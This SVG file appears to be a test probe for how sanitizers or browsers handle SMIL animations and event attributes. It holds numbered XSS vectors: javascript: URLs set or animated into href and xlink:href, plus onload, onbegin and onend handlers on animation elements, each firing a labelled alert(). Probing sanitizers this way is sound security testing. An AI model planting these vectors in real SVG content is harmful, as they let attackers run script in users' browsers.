<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="900" height="640" viewBox="0 0 900 640" onload="alert('P4_ROOT_ONLOAD')">
  <title id="p4-title">probe4 smil and events</title>
  <rect id="p4-bg" x="0" y="0" width="900" height="640" fill="#ffffff"/>
  <text id="p4-start" x="10" y="24" font-size="16" fill="#000">P4 START: wait 1s, then click a row</text>

  <a id="p4-safe" href="https://example.com/p4-safe"><text x="10" y="52" font-size="13">01 safe https (control)</text></a>

  <a id="p4-set-href" href="https://example.com/p4-before">
    <text x="10" y="76" font-size="13">02 set href</text>
    <set attributeName="href" to="javascript:alert('P4_SET_HREF')" begin="0s"/>
  </a>

  <a id="p4-animate-href" href="https://example.com/p4-before">
    <text x="10" y="100" font-size="13">03 animate href</text>
    <animate attributeName="href" values="https://example.com/p4-before;javascript:alert('P4_ANIM_HREF')" begin="0s" dur="0.2s" fill="freeze"/>
  </a>

  <a id="p4-set-xlink" xlink:href="https://example.com/p4-before">
    <text x="10" y="124" font-size="13">04 set xlink:href</text>
    <set attributeName="xlink:href" to="javascript:alert('P4_SET_XLINK')" begin="0s"/>
  </a>

  <a id="p4-animate-xlink" xlink:href="https://example.com/p4-before">
    <text x="10" y="148" font-size="13">05 animate xlink:href</text>
    <animate attributeName="xlink:href" values="https://example.com/p4-before;javascript:alert('P4_ANIM_XLINK')" begin="0s" dur="0.2s" fill="freeze"/>
  </a>

  <a id="p4-from-to" href="https://example.com/p4-before">
    <text x="10" y="172" font-size="13">06 animate from/to href</text>
    <animate attributeName="href" from="https://example.com/p4-before" to="javascript:alert('P4_FROMTO')" begin="0s" dur="0.2s" fill="freeze"/>
  </a>

  <a id="p4-set-onload" href="https://example.com/p4-before">
    <text x="10" y="196" font-size="13">07 set onload attr</text>
    <set attributeName="onload" to="alert('P4_SET_ONLOAD')" begin="0s"/>
  </a>

  <a id="p4-event-onbegin" href="https://example.com/p4-before">
    <text x="10" y="220" font-size="13">08 animate onbegin</text>
    <animate attributeName="opacity" values="1;0.5" begin="0s" dur="1s" onbegin="alert('P4_ONBEGIN')"/>
  </a>

  <a id="p4-event-onload" href="https://example.com/p4-before">
    <text x="10" y="244" font-size="13">09 animate onload</text>
    <animate attributeName="opacity" values="1;0.5" begin="0s" dur="1s" onload="alert('P4_ANIM_ONLOAD')"/>
  </a>

  <a id="p4-event-onend" href="https://example.com/p4-before">
    <text x="10" y="268" font-size="13">10 animate onend</text>
    <animate attributeName="opacity" values="1;0.5" begin="0s" dur="0.1s" onend="alert('P4_ONEND')"/>
  </a>

  <a id="p4-motion" href="https://example.com/p4-before">
    <text x="10" y="292" font-size="13">11 animateMotion onbegin</text>
    <animateMotion dur="0.1s" begin="0s" path="M0,0 L10,10" onbegin="alert('P4_MOTION')"/>
  </a>

  <a id="p4-transform" href="https://example.com/p4-before">
    <text x="10" y="316" font-size="13">12 animateTransform onbegin</text>
    <animateTransform attributeName="transform" type="rotate" values="0;10" dur="0.1s" begin="0s" onbegin="alert('P4_TRANSFORM')"/>
  </a>

  <a id="p4-handler" href="https://example.com/p4-before">
    <text x="10" y="340" font-size="13">13 handler/listener</text>
    <handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert('P4_HANDLER')</handler>
    <listener event="load" handler="#p4-h1"/>
  </a>

  <set id="p4-safe-set" attributeName="opacity" to="0.9" begin="0s"/>
  <text id="p4-after-safe-set" x="10" y="380" font-size="16" fill="#000">P4 AFTER SAFE SET</text>

  <rect id="p4-end-box" x="10" y="410" width="160" height="34" fill="#eee" stroke="#000"/>
  <text id="p4-end-label" x="18" y="432" font-size="12" fill="#000">P4-END-BOX</text>
</svg>
